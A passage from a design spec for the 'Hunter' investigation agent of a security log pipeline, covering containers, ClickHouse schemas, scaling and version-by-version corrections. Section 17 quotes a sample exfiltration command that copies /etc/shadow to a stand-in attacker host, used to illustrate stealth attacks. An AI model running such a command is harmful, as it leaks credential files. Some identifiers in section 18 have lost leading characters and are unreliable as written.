                f"Bias={mean_bias:+.3f} ({'over-alerting' if mean_bias > 0 else 'under-alerting'})."
            )
```

### Feature Staleness

```python
def check_feature_staleness(ch_client):
    """Check if ClickHouse materialized views are stale."""
    try:
        staleness = ch_client.execute("""
            SELECT name, modification_time
            FROM system.tables
            WHERE database = 'clif_logs' AND name LIKE 'features_%'
        """)
        for row in staleness:
            age_seconds = (datetime.utcnow() - row[1]).total_seconds()
            if age_seconds > 300:
                logger.warning(f"STALE TABLE: {row[0]} last modified {age_seconds:.0f}s ago")
    except Exception as e:
        logger.warning(f"Feature staleness check failed: {e}")
```

---

## 9. Infrastructure & Performance

### Container Spec

```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y librdkafka-dev gcc curl && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Health check — port 8400 (NOT 8200, which is Merkle Service)
HEALTHCHECK --interval=30s --timeout=10s --start-period=60s --retries=3 \
  CMD curl -f http://localhost:8400/health || exit 1

EXPOSE 8400
CMD ["python", "app.py"]
```

### requirements.txt

```
confluent-kafka==2.3.0
clickhouse-driver==0.2.7
flask==3.0.0
numpy==1.26.4
catboost==1.2.3
requests==2.31.0
orjson==3.9.10
scipy==1.12.0
```

### Resource Budget

```
Container limit:  4GB RAM / 2GB reserved
CatBoost model:   ~50MB on disk, ~200MB in memory at inference
ClickHouse conn:  single native TCP (port 9000), max_execution_time=8-10s
LanceDB:          3 HTTP calls per event, 5s timeout each (circuit breaker: 60s backoff) — V5: attack_embeddings + historical_incidents + log_embeddings
ThreadPoolExecutor: L1(3 workers) + L2(2 workers)
Kafka consumer:   group=hunter-agent, topic=hunter-tasks, auto_offset_reset=earliest
Flask health:     port 8400
```

### Port Assignment Verification

| Port | Service | Conflict Check |
|------|---------|----------------|
| 8100 | LanceDB (profile: `full` only) | ✅ No conflict (but requires `--profile full`) |
| 8200 | **FREE** (Merkle has no HTTP port) | ✅ Available |
| 8300-8303 | Triage Agents (4 instances) | ⛔ TAKEN — do not use |
| **8400** | **Hunter Agent** | ✅ Available |

### Expected Latency Budget per Event

```
Kafka deserialize:          < 1ms
L1 parallel (worst case):
  Temporal (3 CH queries):    ~60ms
  LanceDB (3 parallel):         ~30ms   (0ms if unavailable — fallback, 7 neutral features)
  Graph (5 CH queries):       ~100ms   ← bottleneck
  → L1 total:                 ~100ms   (limited by slowest thread)

L2 parallel:
  MITRE mapper (1 CH query):  ~15ms
  Campaign detector (1 JOIN): ~40ms
  → L2 total:                 ~40ms

Narrative + scoring:          < 5ms
Kafka publish:                < 5ms
CH direct write (training):   < 10ms

TOTAL per event:              ~160-200ms target
TOTAL worst case:             ~400ms (CH timeouts or LanceDB cold start)
```

### Throughput

Hunter consumes from `hunter-tasks` which only contains escalated events (~5-15% of Triage output). At 82K EPS through Triage:
- 82,000 × 0.10 = ~8,200 escalated events/second peak
- With `adjusted_score > 0.65` gate: typically ~40-60% of escalated events → ~3,300-5,000 investigations/second
- At 200ms per investigation: 3-5 instances needed for sustained peak rates
- For Phase 4 development / single machine: one instance is fine if escalation rate is low
- `hunter-tasks` topic has 6 partitions → max 6 Hunter instances before idle consumers

### Horizontal Scaling

```yaml
# docker-compose.pc2.yml addition
clif-hunter-agent-1:
  container_name: clif-hunter-agent-1
  build:
    context: ./agents/hunter
  environment:
    KAFKA_BROKERS: "clif-redpanda01:9092"
    CONSUMER_GROUP_ID: "hunter-agent"
    INPUT_TOPIC: "hunter-tasks"
    CLICKHOUSE_HOST: "clif-clickhouse01"
    LANCEDB_HOST: "clif-lancedb"
    HEALTH_PORT: "8400"
    HUNTER_INSTANCE_ID: "1"
  ports:
    - "8400:8400"
  depends_on:
    - clif-triage-agent
    - clif-lancedb
  mem_limit: 4g
  restart: unless-stopped
```

Since `hunter-tasks` has 6 partitions (configured by `redpanda-init` as `PARTITIONS/2`), 3 Hunter instances each handle 2 partitions automatically via Kafka consumer group rebalancing.

---

## 10. Output Contract & Downstream Integration

### How Data Flows to ClickHouse

Hunter does NOT write directly to `hunter_investigations`. Instead:

```
Hunter → publishes JSON to "hunter-results" topic
       → Consumer subscribes to "hunter-results"
       → Consumer calls _build_hunter_investigation_row()
       → Consumer inserts into hunter_investigations table
```

The consumer (consumer/app.py line 106) already has this mapping:
```python
"hunter-results": "hunter_investigations"
```

And the row builder (consumer/app.py line 394) extracts exactly the 17 fields listed in Section 2's output schema.

### Direct Write: hunter_training_data

Hunter writes directly to `hunter_training_data` (NOT through the consumer) because this table doesn't have a Kafka topic. This uses `clickhouse-driver` native TCP:

```python
def save_training_sample(ch_client, event_id, alert_id, feature_vector):
    ch_client.execute(
        "INSERT INTO clif_logs.hunter_training_data "
        "(event_id, alert_id, features, timestamp) VALUES",
        [{
            "event_id": event_id,
            "alert_id": alert_id,
            "features": feature_vector.tolist(),  # 36-dim float list (V5: expanded from 33)
            "timestamp": datetime.utcnow(),
        }]
    )
```

### Flask Health Endpoints (port 8400)

```python
@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "scorer_mode": scorer.mode,
        "service": "clif-hunter-agent",
    }), 200

@app.route("/ready")
def ready():
    if ch_connected and kafka_connected:
        return jsonify({"ready": True}), 200
    return jsonify({"ready": False}), 503

@app.route("/stats")
def stats():
    return jsonify({
        "events_processed": counter.events_processed,
        "events_escalated": counter.events_escalated,
        "avg_investigation_ms": counter.avg_ms,
        "scorer_mode": scorer.mode,
        "training_samples": scorer.sample_count,
        "last_retrain": scorer.last_retrain_iso,
        "drift_kl": drift.last_kl,
        "drift_psi": drift.last_psi,
    }), 200
```

---

## 11. Schema Migrations

These tables do NOT exist in the current `schema.sql` and must be added.

### New Table: hunter_training_data

```sql
-- Add after hunter_investigations (table 14) in clickhouse/schema.sql

CREATE TABLE IF NOT EXISTS clif_logs.hunter_training_data ON CLUSTER 'clif_cluster'
(
    event_id    UUID                                        CODEC(ZSTD(3)),
    alert_id    UUID                                        CODEC(ZSTD(3)),
    features    Array(Float32)                              CODEC(ZSTD(3)),   -- 36-dim vector (V5: expanded from 33)
    label       Nullable(Int8)                              CODEC(ZSTD(1)),   -- NULL until labeled
    confidence  Nullable(Float32)                           CODEC(ZSTD(1)),   -- label confidence weight
    timestamp   DateTime64(3) DEFAULT now64()               CODEC(Delta, ZSTD(3)),

    INDEX idx_label label TYPE set(5) GRANULARITY 1
)
ENGINE = ReplicatedMergeTree(
    '/clickhouse/tables/{shard}/hunter_training_data',
    '{replica}'
)
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, event_id)
TTL toDateTime(timestamp) + INTERVAL 180 DAY DELETE
SETTINGS
    index_granularity = 8192,
    storage_policy    = 'clif_tiered';
```

### New Table: hunter_model_health

```sql
CREATE TABLE IF NOT EXISTS clif_logs.hunter_model_health ON CLUSTER 'clif_cluster'
(
    metric      LowCardinality(String)                      CODEC(ZSTD(1)),
    value       Float64                                     CODEC(ZSTD(3)),
    timestamp   DateTime64(3) DEFAULT now64()               CODEC(Delta, ZSTD(3))
)
ENGINE = ReplicatedMergeTree(
    '/clickhouse/tables/{shard}/hunter_model_health',
    '{replica}'
)
PARTITION BY toYYYYMM(timestamp)
ORDER BY (metric, timestamp)
TTL toDateTime(timestamp) + INTERVAL 30 DAY DELETE
SETTINGS index_granularity = 256;
```

### Existing Tables — No Changes Required

The following tables already exist and require no schema modifications:

| Table | Used By | Status |
|-------|---------|--------|
| `hunter_investigations` | Consumer (hunter-results → CH) | ✅ Exists, 17 columns match |
| `triage_scores` | Graph builder, campaign detector, trainer | ✅ Exists, all referenced columns present |
| `network_events` | Graph builder, temporal correlator, campaign detector | ✅ Exists, src_ip/dst_ip/bytes_sent/bytes_received present |
| `security_events` | Temporal correlator | ✅ Exists, ip_address/severity/mitre_tactic present |
| `process_events` | Temporal correlator | ✅ Exists, binary_path/arguments/pid/ppid present |
| `mitre_mapping_rules` | MITRE mapper | ✅ Exists, 9 seeded rules |
| `feedback_labels` | Self-supervised trainer | ✅ Exists, label Enum8(true_positive, false_positive, unknown) |
| `verifier_results` | Self-supervised trainer (Phase 5) | ✅ Exists, status Enum8 with verified/false_positive |

---

## 12. Implementation Phases

### Phase 4A — Core Pipeline (Weeks 1-2)

Target: Hunter consuming from Kafka, running L1, publishing to hunter-results with heuristic scoring.

- [ ] Scaffold `app.py` with Kafka consumer loop (consumer group: `hunter-agent`, topic: `hunter-tasks`)
- [ ] Implement `config.py` with all env vars (port 8400, topic names, CH connection)
- [ ] Implement `temporal_correlator.py` (3 CH queries with correct column names)
- [ ] Implement `similarity_searcher.py` (3 LanceDB POST calls — V5: attack_embeddings + historical_incidents + log_embeddings with multi-signal decision matrix + graceful fallback when LanceDB unavailable)
- [ ] Implement `graph_builder.py` (5 CH queries, 8 features, toString() for IPv4 columns)
- [ ] Implement `heuristic_scorer.py` (8-component formula, weights sum to 1.0)
- [ ] Implement `rag_narrative.py` (narrative builder + severity + finding_type)
- [ ] Add Flask health endpoints on port 8400
- [ ] Add `hunter_training_data` and `hunter_model_health` tables to `schema.sql`
- [ ] Add Docker service to `docker-compose.yml` (main compose file, not just pc2)
- [ ] Enable LanceDB with `--profile full` or add LanceDB fallback test
- [ ] Test end-to-end: synthetic escalated event → hunter-results → consumer → CH

### Phase 4B — Intelligence Layer (Week 3)

Target: Full L2 investigation, CatBoost scorer operational.

- [ ] Implement `mitre_mapper.py` with feature context mapping
- [ ] Implement `campaign_detector.py` with cross-table JOIN (triage_scores + network_events)
- [ ] Implement `catboost_scorer.py` with 36-dim vector + hot-reload (V5: 3 new similarity features)
- [ ] Implement `self_supervised_trainer.py` with label hierarchy
- [ ] Implement `drift_detector.py` (KL divergence + PSI)
- [ ] Wire `scorer.py` mode switcher (heuristic → catboost at 100 samples)
- [ ] Integration test: verify all 36 features populate correctly (V5: includes attack_distance, novelty_flag, evasion_flag)

### Phase 4C — Production Hardening (Week 4)

Target: Production-ready with monitoring, scaling, and graceful degradation.

- [ ] Add horizontal scaling (3 Hunter instances in docker-compose, same consumer group)
- [ ] Add `max_execution_time` guards on all ClickHouse queries
- [ ] Add circuit breaker for LanceDB HTTP calls (5s timeout, fallback to neutral features)
- [ ] Wire Hunter metrics to Prometheus scrape (port 8400/metrics)
- [ ] Add Grafana dashboard panel for Hunter (investigation latency, scorer mode, drift)
- [ ] Consumer fix: verify `msg.get("summary")` works with Hunter's `summary` field — no code change needed (V4 publishes as `summary` directly)
- [ ] Load test at realistic escalation rate
- [ ] Document all environment variables

---

## 13. File Layout

```
agents/hunter/
├── app.py                          # Kafka consumer loop + Flask health (port 8400)
├── config.py                       # All env vars, Kafka/CH/LanceDB config
├── requirements.txt
├── Dockerfile                      # python:3.11-slim, port 8400
├── models/                         # Volume-mounted CatBoost artifact
│   └── hunter_catboost.cbm
├── investigation/
│   ├── __init__.py
│   ├── temporal_correlator.py      # 3 ClickHouse queries, ±10min window
│   │                               #   security_events: toString(ip_address)
│   │                               #   network_events: toString(src_ip)
│   │                               #   process_events: hostname + binary_path/pid/ppid
│   ├── similarity_searcher.py      # 3 LanceDB HTTP POST calls (V5 redesigned)
│   │                               #   attack_embeddings → known attack matching
│   │                               #   historical_incidents → RAG context
│   │                               #   log_embeddings → context only (NEVER verdict)
│   │                               #   Multi-signal decision matrix (cross-ref EIF/rarity)
│   │                               #   7 output features (V5: expanded from 4)
│   ├── graph_builder.py            # 5 ClickHouse queries, 8 SQL features
│   │                               #   network_events: toString(src_ip)/toString(dst_ip)
│   │                               #   triage_scores: source_ip (String, direct compare)
│   ├── mitre_mapper.py             # mitre_mapping_rules FINAL query + rule matching
│   ├── campaign_detector.py        # triage_scores JOIN network_events
│   └── rag_narrative.py            # Narrative assembly + severity + finding_type
├── scoring/
│   ├── __init__.py
│   ├── heuristic_scorer.py         # 10-component weighted formula (V5: sum=1.00, novelty+evasion added)
│   ├── catboost_scorer.py          # 36-feature CatBoost inference + hot-reload (V5)
│   └── scorer.py                   # Mode switcher (heuristic → catboost at 100 samples)
├── training/
│   ├── __init__.py
│   ├── self_supervised_trainer.py  # 6hr background retraining loop
│   ├── label_builder.py            # Priority hierarchy (analyst > verifier > pseudo)
│   └── feature_store.py            # hunter_training_data R/W (direct ClickHouse)
└── monitoring/
    ├── __init__.py
    └── drift_detector.py           # KL divergence + PSI + table staleness checks
```

---

## 14. Risk Register

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| ClickHouse graph queries timeout under load | Medium | High | `max_execution_time=8` on all queries, zero-vector fallback, LIMIT clauses |
| LanceDB HTTP unavailable | **High** (profile-gated, not always running) | Medium | 3s connection timeout, 60s circuit breaker, fallback to neutral similarity features (7 features all neutral). Document that `--profile full` is required for full capability. |
| LanceDB normal-neighbor contamination (V5) | **Eliminated** | ~~Critical~~ None | V5 redesign: Hunter searches `attack_embeddings` (confirmed attacks only) for verdict, `log_embeddings` for context only. Multi-signal decision matrix cross-refs EIF score. LanceDB is CONTEXT PROVIDER, never DECISION MAKER. |
| CatBoost model corrupted on disk | Low | Low | Atomic save (.tmp → os.replace), fallback to heuristic on load failure |
| Label quality too low for CatBoost | High | High | Tighten pseudo-label thresholds, wait for analyst feedback before enabling |
| Escalation rate spike overloads Hunter | Medium | High | Horizontal scaling (3+ instances, same consumer group), rate logging |
| Drift alert fires constantly | Low | Medium | Tune thresholds per environment, min 10 samples before drift check |
| GNN added prematurely before Verifier exists | Medium | High | GNN blocked until Phase 5. No exceptions. |
| Consumer `summary` vs `narrative` mismatch | ~~Known~~ **Resolved in V4** | ~~Low~~ None | Hunter publishes field as `summary` — matches consumer expectation directly |
| toString(IPv4) performance in WHERE clauses | Low | Medium | ClickHouse handles this efficiently for sub-million row scans |

---

## 15. Compatibility Notes — V2 → V3 Changes

This section documents every change from V2 to V3, with the exact source file that required each fix.

### Issue 1: Phantom Input Fields
**Source:** `agents/triage/score_fusion.py` lines 42-68 (TriageResult dataclass)
**V2 claimed:** Input includes `dst_ip`, `dst_port`, `dst_bytes`, `midas_burst_score`, `source_threshold`, `log_template`, `summary`, `allowlisted`
**V3 fix:** Removed all 8 phantom fields. TriageResult has exactly 26 fields, none of those exist.

### Issue 2: triage_scores Missing Columns
**Source:** `clickhouse/schema.sql` lines 571-635 (triage_scores table)
**V2 claimed:** Can query `dst_ip`, `dst_port`, `dst_bytes` from `triage_scores`
**V3 fix:** All destination/network queries use `network_events` table instead (which has `src_ip IPv4`, `dst_ip IPv4`, `dst_port UInt16`, `bytes_sent UInt64`, `bytes_received UInt64`).

### Issue 3: hunter_investigations Schema Mismatch
**Source:** `clickhouse/schema.sql` lines 643-688 (hunter_investigations table)
**V2 claimed:** Table has `event_id`, `scorer_mode`, `investigation_ms`, `narrative`, `timestamp`
**V3 fix:** Output aligned to existing schema. `event_id`/`scorer_mode`/`investigation_ms` moved to `evidence_json`. Field name `narrative` kept (consumer update deferred). Status uses existing Enum values (0-4), severity uses existing Enum values (0-4), finding_type is String not Enum.

### Issue 4: Consumer Field Name — narrative vs summary (RESOLVED in V4)
**Source:** `consumer/app.py` line 408 — `_safe_str(msg.get("summary"))`
**V2 impact:** Consumer would store empty string for the investigation narrative
**V3 fix:** Documented as intentional deferral. Consumer needs one-line fix: `msg.get("narrative")`.
**V4 fix:** Hunter now publishes the field as `summary` directly. Consumer expects `msg.get("summary")` — perfect match. No consumer change needed whatsoever.

### Issue 5: Missing started_at / completed_at / trigger_score
**Source:** `consumer/app.py` lines 399-405
**V2 claimed:** Output has `investigation_duration_ms` at top level
**V3 fix:** Output now includes `started_at`, `completed_at`, `trigger_score` as top-level fields matching consumer expectations. Duration goes into `evidence_json`.

### Issue 6: Wrong Raw Feature Names
**Source:** `agents/triage/feature_extractor.py` lines 41-60 (FEATURE_NAMES)
**V2 claimed:** Raw features are `token_count`, `entropy`, `rarity_score`, `rare_token_ratio`, `conn_count_5min`, etc.
**V3 fix:** Actual features are `hour_of_day`, `day_of_week`, `severity_numeric`, etc. (KDD-style names). But this is moot because of Issue 7.

### Issue 7: Raw Features Not Available
**Source:** `agents/triage/app.py` line 707 — `result_dict = asdict(result)`
**V2 claimed:** Hunter receives a "Raw feature dict (20)" alongside TriageResult
**V3 fix:** Triage publishes `asdict(TriageResult)` only — no raw features. Feature vector redesigned from 42-dim to 33-dim using only available data (V5: expanded to 36-dim with 3 new similarity features).

### Issue 8: LanceDB API Contract
**Source:** `lancedb-service/app.py` lines 541-545 (SearchRequest model), lines 645-670 (POST /search endpoint)
**V2 status:** API contract was actually correct in V2
**V3:** Confirmed — POST `/search` with `{query, table, limit, filter}` body. The `filter` field (`str | None`, default `None`) is optional — Hunter does not use it. Three tables available: `log_embeddings`, `threat_intel`, `historical_incidents`.
**V5 update:** 4 tables: `log_embeddings` (context only), `attack_embeddings` (V5 NEW — confirmed attacks), `threat_intel`, `historical_incidents`. Hunter queries 3 tables per event: `attack_embeddings` for verdict, `historical_incidents` for RAG, `log_embeddings` for context. The `attack_embeddings` table must be added to LanceDB service.

### Issue 9: Missing New Tables
**Source:** `clickhouse/schema.sql` — no `hunter_training_data` or `hunter_model_health` tables exist
**V3 fix:** Full CREATE TABLE statements added in Section 11 (Schema Migrations).

### Issue 10: Port 8200 Conflict
**Source:** README.md Docker Services table — `clif-merkle` on port 8200
**V2 claimed:** Hunter Flask on port 8200
**V3 fix:** Hunter uses port 8400.

### Process Events Column Names
**Source:** `clickhouse/schema.sql` lines 108-153 (process_events table)
**V2 claimed:** Temporal query selects `process_name`, `parent_process`
**V3 fix:** Correct columns are `binary_path` (String), `arguments` (String), `pid` (UInt32), `ppid` (UInt32). No `process_name` or `parent_process` columns exist.

### Heuristic Weight — midas_burst_score Removed
**Source:** TriageResult dataclass has no `midas_burst_score` field
**V2 claimed:** Heuristic weight of 0.05 for `midas_burst_score`
**V3 fix:** Replaced with `ioc` weight (0.05) using `ioc_match` from TriageResult. Total weights still sum to 1.00.

---

## 16. V3 → V4 Corrections (Pipeline Alignment — March 2026)

These corrections were made after auditing the V3 plan against the live running pipeline (all containers healthy, all topics verified).

### V4-1: Input Topic Changed from `triage-scores` to `hunter-tasks`
**Source:** `agents/triage/app.py` lines 808-816 — escalated events published to `hunter-tasks`
**V3 claimed:** Hunter consumes `triage-scores` (all events) and filters for `action='escalate'`
**V4 fix:** Hunter consumes `hunter-tasks` (escalated-only). This topic is created by `redpanda-init` with 6 partitions. All messages are pre-filtered `action='escalate'` by Triage. Eliminates ~85-95% unnecessary message processing.

### V4-2: Filter Logic Simplified
**Source:** `hunter-tasks` topic contract — all messages have `action='escalate'`
**V3 claimed:** Filter = `action='escalate' AND adjusted_score > 0.65`
**V4 fix:** Filter = `adjusted_score > 0.65` only. The `action` check is redundant.

### V4-3: `agents/hunter/` Directory Does Not Exist
**Source:** `agents/` directory listing — only `triage/` and `Data/` subdirectories
**V3 claimed:** An empty `Dockerfile` stub exists at `agents/hunter/Dockerfile`
**V4 fix:** The entire `agents/hunter/` directory must be created from scratch. There is no stub.

### V4-4: Merkle Service Has No HTTP Port
**Source:** `docker-compose.yml` — `clif-merkle` service definition has no `ports:` mapping
**V3 claimed:** Port 8200 is taken by Merkle Service
**V4 fix:** Merkle runs as an internal batch service (connects to ClickHouse + MinIO). Port 8200 is actually free. Hunter still uses 8400 for clarity.

### V4-5: LanceDB is Profile-Gated
**Source:** `docker-compose.yml` — LanceDB service has `profiles: [full]`
**V3 claimed:** LanceDB always available at `http://lancedb:8100`
**V4 fix:** LanceDB requires `docker compose --profile full up` to run. Hunter must implement a circuit breaker: 3s connection timeout, 60s backoff on failure, fallback to neutral similarity features. For development/lightweight mode, Hunter runs fine without LanceDB.

### V4-6: 4th LanceDB Table Available → V5: `attack_embeddings` (replaces `security_embeddings`)
**Source:** `lancedb-service/app.py` — 4 vector tables defined
**V3 claimed:** 3 tables: `log_embeddings`, `threat_intel`, `historical_incidents`
**V4 fix:** 4 tables: `log_embeddings`, **`security_embeddings`**, `threat_intel`, `historical_incidents`. The `security_embeddings` table can provide enriched matching for security-type events.
**V5 correction:** `security_embeddings` is referenced in code comments but NEVER created by `_ensure_tables()` in `lancedb-service/app.py`. Replaced with **`attack_embeddings`** — a new table storing ONLY confirmed attacks/escalated events. This solves the critical flaw where searching `log_embeddings` (which contains mostly normal events) would cause Hunter to contradict Triage's escalation verdict. Must be added to LanceDB service.

### V4-7: narrative → summary Field Resolved
**Source:** `consumer/app.py` line 426 — `_safe_str(msg.get("summary"))`
**V3 claimed:** Hunter publishes `narrative`, consumer reads `summary` — deferred mismatch
**V4 fix:** Hunter publishes the field as `summary` (not `narrative`). Consumer's `msg.get("summary")` works perfectly. Zero consumer code changes needed.

### V4-8: Triage Publishes to 3 Topics on Escalate
**Source:** `agents/triage/app.py` lines 798-816
**V3 claimed:** Triage publishes to `triage-scores` (always) + `anomaly-alerts` (on escalate)
**V4 fix:** Triage publishes to `triage-scores` (always) + `anomaly-alerts` + **`hunter-tasks`** (both on escalate). The `hunter-tasks` publication makes the dedicated input topic for Hunter.

### V4-9: Triage Agent Port Range
**Source:** `docker-compose.yml` — 4 triage agent service definitions
**V3 claimed:** Port 8300 = Triage Agent
**V4 fix:** Ports 8300-8303 used by 4 triage agent instances (`clif-triage-agent` on 8300, `clif-triage-agent-2` on 8301, `clif-triage-agent-3` on 8302, `clif-triage-agent-4` on 8303).

---

*Document version: 6.0 | Pipeline version: CLIF v5.1 | Phase: 4 — Hunter Agent*
*All field names, column types, port assignments, and topic routing verified against live pipeline as of March 2026.*
*V3→V4 corrections applied after running all 22 Docker services and confirming triage agent healthy state.*
*V4→V5 corrections applied after identifying critical LanceDB normal-neighbor contamination flaw.*
*V5→V6 corrections applied after identifying 4 logic flaws: pseudo-negative label void, drift baseline self-contamination, graph escalation amplification, and MITRE blind-spot trigger features.*

---

## 17. V4 → V5 Corrections (LanceDB Architectural Redesign — March 2026)

These corrections address a critical architectural flaw where LanceDB's `log_embeddings` table (containing mostly normal events) could cause Hunter to contradict Triage's ML-based escalation verdict.

### V5-1: `security_embeddings` → `attack_embeddings`
**Source:** `lancedb-service/app.py` `_ensure_tables()` method — only creates `log_embeddings`, `threat_intel`, `historical_incidents`
**V4 claimed:** `security_embeddings` table exists as 4th table
**V5 fix:** `security_embeddings` is referenced in code comments but NEVER created. Replaced with `attack_embeddings` — stores ONLY confirmed attacks/escalated events (from `triage_scores WHERE action='escalate'`, `security_events WHERE severity >= 5`, `feedback_labels WHERE label='true_positive'`). Must be added to LanceDB service.

### V5-2: LanceDB Normal-Neighbor Contamination (CRITICAL FIX)
**Source:** Architectural analysis of similarity search logic
**V4 approach:** Hunter searched `log_embeddings` and used distance as a direct feature. If nearest neighbors were all severity=0 (normal), the similarity feature would push Hunter toward "benign."
**The problem:** A novel zero-day exploit's text (e.g., "buffer overflow libxml2 CVE-2026-XXXX") is semantically similar to normal maintenance logs ("libxml2 updated to v2.12.4", distance=0.31). LanceDB embeddings encode textual similarity, NOT malicious intent. The same problem occurs with stealth attacks that mimic normal operations (e.g., "rsync /etc/shadow attacker@evil.com" vs. "rsync /data/backups backup-srv:/archive/", distance=0.12).
**V5 fix:** 
- `attack_embeddings` searched for verdict ("is this a known attack?")
- `log_embeddings` searched for context only ("what does this resemble?") — NEVER used for verdict
- `historical_incidents` searched for RAG context
- Multi-signal decision matrix cross-references LanceDB distances with Triage's `eif_score` and `template_rarity`
- When LanceDB shows event is textually similar to normal logs BUT EIF says it's a statistical outlier → classified as `evasion_technique` (MITRE T1036), not "benign"
- When no match in `attack_embeddings` + high EIF → classified as `novel_anomaly` (zero-day treatment)

### V5-3: Feature Vector 33 → 36 Dimensions
**Source:** New similarity decision matrix requires 3 additional output features
**V4 had:** 4 similarity features (min_distance, mean_distance, incident_match, incident_severity)
**V5 adds:** `similarity_attack_distance` (distance to nearest confirmed attack), `similarity_novelty_flag` (1 if novel), `similarity_evasion_flag` (1 if stealth/evasion)
**Impact:** CatBoost model, training schema, and feature validation all updated to 36-dim.

### V5-4: Heuristic Weights Restructured
**Source:** Similarity weight 0.10 was too high for a signal that could mislead
**V4 had:** `similarity: 0.10` (single weight, used `1.0 - min_distance`)
**V5 fix:** Split into `similarity: 0.05` (attack distance) + `novelty: 0.03` (RAISES score) + `evasion: 0.02` (RAISES score). Total still 0.10, but novelty and evasion flags increase investigation confidence rather than lowering it.

### V5-5: New Finding Types Added
**Source:** `determine_finding_type()` needed to express novel and evasion classifications
**V4 had:** `campaign`, `ioc_correlation`, `multi_vector`, `kill_chain`, `anomaly`
**V5 adds:** `novel_anomaly` (no match in attack_embeddings + high EIF) and `evasion_technique` (textually normal but statistically anomalous — MITRE T1036 Masquerading)

### V5-6: Narrative Builder Enhanced
**Source:** `build_narrative()` in `rag_narrative.py` needed context-aware framing
**V4 had:** Generic similarity context ("Similar pattern found")
**V5 fix:** Three distinct framing modes:
- **Evasion:** "STEALTH ALERT: Event is textually similar to normal operations but statistical features are anomalous. High probability of defense evasion."
- **Novel:** "NOVEL PATTERN: No matching attack patterns found. EIF confirms statistical anomaly. Treat as zero-day."
- **Known:** "Historical match: Similar pattern found in historical incidents."

### V5-7: Architectural Rule Established
**LanceDB is a CONTEXT PROVIDER, never a DECISION MAKER.**
- Hunter uses LanceDB to classify WHAT KIND of attack (known, novel, evasion), not WHETHER it's an attack.
- Triage's ML scores (especially EIF isolation score) are the ground truth for anomaly detection.
- When textual similarity and statistical anomaly conflict, the conflict ITSELF is the strongest signal of a stealth/evasion attack.
- Hunter NEVER downgrades a Triage escalation based solely on LanceDB similarity to normal events.

---

## 18. V5 -> V6 Corrections (Training, Drift, Graph, MITRE -- March 2026)

Four logic flaws discovered through systematic pipeline audit. Each flaw was verified against
the actual ClickHouse schema, Kafka topics, and consumer code before fixes were applied.

### V6-1: Pseudo-Negative Label Void (CRITICAL)
**Flaw:** uild_training_set() queried hunter_training_data JOIN triage_scores WHERE ts.action='discard'.
**Root cause:** Hunter only investigates events from the hunter-tasks topic -- which Triage only
publishes for ction='escalate' events. hunter_training_data contains ONLY escalated events.
Discarded events are never consumed by Hunter and never written to hunter_training_data. The JOIN
always returns zero rows.
**Impact:** CatBoost trains on 100% positive examples -> confidence ~ 1.0 for everything -> escalation
rate trends to 100% over time.
**Fix:** Pull pseudo-negatives from hunter_training_data JOIN hunter_investigations ON alert_id where
Hunter's verdict was inconclusive (severity IN ('info','low') AND confidence < 0.30 AND finding_type NOT
IN dangerous types). Startup guard warns if zero rows returned after 24h of operation.

### V6-2: Drift Baseline Self-Contamination
**Flaw:** check_score_drift() used last-24h as baseline and last-1h as current. Both windows contain
Hunter's own output, both drift together during gradual degradation -> KL stays low -> alarm never fires.
**Fix A:** Stable 7-day-to-1-day window as baseline (predates any recent drift). Requires >= 50 samples.
**Fix B:** Triage-anchored divergence: avg(abs(confidence - trigger_score)) from hunter_investigations.
trigger_score (Triage's adjusted_score) is an independent anchor computed before Hunter ran.
Threshold: 0.25. Bias sign distinguishes over-alerting vs. under-alerting. Both metrics written to
hunter_model_health.

### V6-3: Graph Escalation Amplification
**Flaw:** Query 4 counted all escalations for neighbor IPs with no cap. A noisy scanner with 500+
escalations inflated graph_neighbor_escalate_rate for every connected host indefinitely.
**Fix:** HAVING escalation_count <= 50 OR has_ioc = 1 -- caps noisy infra; IOC-confirmed IPs bypass
the cap. Recency columns recent_6h and recent_24h added. Rate computed from 24h-recent escalating
neighbors only.

### V6-4: MITRE Trigger Feature Blind Spots
**Flaw:** Three features hardcoded as 0 in build_feature_context():
  template_user_created: 0, off_hours: 0, template_priv_escalation: 0
Any MITRE rule with trigger_features containing only these fields silently never fires.
**Fix:** All three derived from TriageResult message data:
  off_hours: triage_msg["timestamp"] is ISO-8601 -> parse UTC hour -> 1 if hour < 7 or >= 19
  template_user_created: keyword match on triage_msg["template_id"] (useradd, adduser, etc.)
  template_priv_escalation: keyword match on triage_msg["template_id"] (sudo, escalat, etc.)
validate_mitre_rules() added as startup check -- logs WARNING for any rule with unknown trigger_features.